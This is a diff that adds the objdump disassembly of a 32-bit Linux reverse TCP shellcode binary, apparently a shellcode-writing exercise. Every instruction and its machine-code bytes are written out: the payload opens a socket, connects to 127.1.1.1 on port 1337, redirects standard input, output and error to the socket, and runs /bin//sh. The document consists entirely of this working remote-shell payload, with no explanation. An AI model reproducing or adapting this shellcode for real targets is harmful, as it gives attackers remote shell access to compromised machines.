@@ -1,0 +1,57 @@
+
+reverse_tcp_883:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048080 <_start>:
+ 8048080:	6a 66                	push   0x66
+ 8048082:	58                   	pop    eax
+ 8048083:	6a 01                	push   0x1
+ 8048085:	5b                   	pop    ebx
+ 8048086:	31 d2                	xor    edx,edx
+ 8048088:	52                   	push   edx
+ 8048089:	53                   	push   ebx
+ 804808a:	6a 02                	push   0x2
+ 804808c:	89 e1                	mov    ecx,esp
+ 804808e:	cd 80                	int    0x80
+ 8048090:	92                   	xchg   edx,eax
+ 8048091:	b0 66                	mov    al,0x66
+ 8048093:	68 7f 01 01 01       	push   0x101017f
+ 8048098:	66 68 05 39          	pushw  0x3905
+ 804809c:	43                   	inc    ebx
+ 804809d:	66 53                	push   bx
+ 804809f:	89 e1                	mov    ecx,esp
+ 80480a1:	6a 10                	push   0x10
+ 80480a3:	51                   	push   ecx
+ 80480a4:	52                   	push   edx
+ 80480a5:	89 e1                	mov    ecx,esp
+ 80480a7:	43                   	inc    ebx
+ 80480a8:	cd 80                	int    0x80
+ 80480aa:	6a 02                	push   0x2
+ 80480ac:	59                   	pop    ecx
+ 80480ad:	87 d3                	xchg   ebx,edx
+
+
+
+080480af <loop>:
+ 80480af:	b0 3f                	mov    al,0x3f
+ 80480b1:	cd 80                	int    0x80
+ 80480b3:	49                   	dec    ecx
+ 80480b4:	79 f9                	jns    80480af <loop>
+ 80480b6:	b0 0b                	mov    al,0xb
+ 80480b8:	41                   	inc    ecx
+ 80480b9:	89 ca                	mov    edx,ecx
+ 80480bb:	52                   	push   edx
+ 80480bc:	68 2f 2f 73 68       	push   0x68732f2f
+ 80480c1:	68 2f 62 69 6e       	push   0x6e69622f
+ 80480c6:	89 e3                	mov    ebx,esp
+ 80480c8:	cd 80                	int    0x80
+
+
+
+
+
+
+
+
